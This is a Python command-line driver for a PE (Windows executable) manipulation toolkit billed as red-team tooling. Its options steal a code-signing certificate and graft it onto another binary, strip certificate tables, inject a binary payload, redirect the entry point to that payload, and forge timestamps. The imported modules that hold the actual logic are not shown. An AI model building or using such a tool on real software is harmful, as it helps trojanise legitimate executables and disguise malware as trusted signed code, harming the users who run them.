#!/usr/bin/env python3
import argparse
import sys
from pe_analyzer import gather_file_info
from pe_modifier import zero_certificate_table, set_timestamp
from sig_stealer import extract_certificate, inject_certificate
from payload_injector import inject_payload

def main():
    parser = argparse.ArgumentParser(description="PE File Manipulation Toolkit for Red Teaming")
    
    # Basic analysis
    parser.add_argument("-i", "--input", help="Input PE file", required=True)
    parser.add_argument("-a", "--analyze", action="store_true", help="Analyze PE file")
    
    # Signature manipulation
    parser.add_argument("--zero-cert", action="store_true", help="Zero out certificate table")
    parser.add_argument("--extract-cert", help="Extract certificate to file")
    parser.add_argument("--inject-cert", help="Inject certificate from file")
    
    # Payload injection
    parser.add_argument("--inject-payload", help="Inject binary payload from file")
    parser.add_argument("--update-entry", action="store_true", 
                       help="Update entry point to payload (use with --inject-payload)")
    
    # Misc modifications
    parser.add_argument("--set-timestamp", type=int, help="Set new timestamp value")
    
    args = parser.parse_args()
    
    try:
        # Basic analysis
        if args.analyze or not any(vars(args).values()):
            pe_info = gather_file_info(args.input)
            print("\n[+] PE File Analysis:")
            for k, v in pe_info.items():
                print(f"{k:20}: {v}")
        
        # Signature manipulation
        if args.zero_cert:
            zero_certificate_table(args.input)
            print("\n[+] Zeroed out certificate table")
        
        if args.extract_cert:
            cert_data = extract_certificate(args.input)
            if cert_data:
                with open(args.extract_cert, 'wb') as f:
                    f.write(cert_data)
                print(f"\n[+] Extracted certificate to {args.extract_cert}")
            else:
                print("\n[-] No certificate found in input file")
        
        if args.inject_cert:
            with open(args.inject_cert, 'rb') as f:
                cert_data = f.read()
            inject_certificate(args.input, cert_data)
            print(f"\n[+] Injected certificate from {args.inject_cert}")
        
        # Payload injection
        if args.inject_payload:
            with open(args.inject_payload, 'rb') as f:
                payload = f.read()
            result = inject_payload(args.input, payload, args.update_entry)
            print("\n[+] Payload injection results:")
            print(f"Injected at offset: 0x{result['injected_at']:X}")
            if args.update_entry:
                print(f"Original entry: 0x{result['original_entry']:X}")
                print(f"New entry: 0x{result['new_entry']:X}")
        
        # Timestamp modification
        if args.set_timestamp:
            set_timestamp(args.input, args.set_timestamp)
            print(f"\n[+] Set new timestamp: {args.set_timestamp}")
    
    except Exception as e:
        print(f"\n[-] Error: {str(e)}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()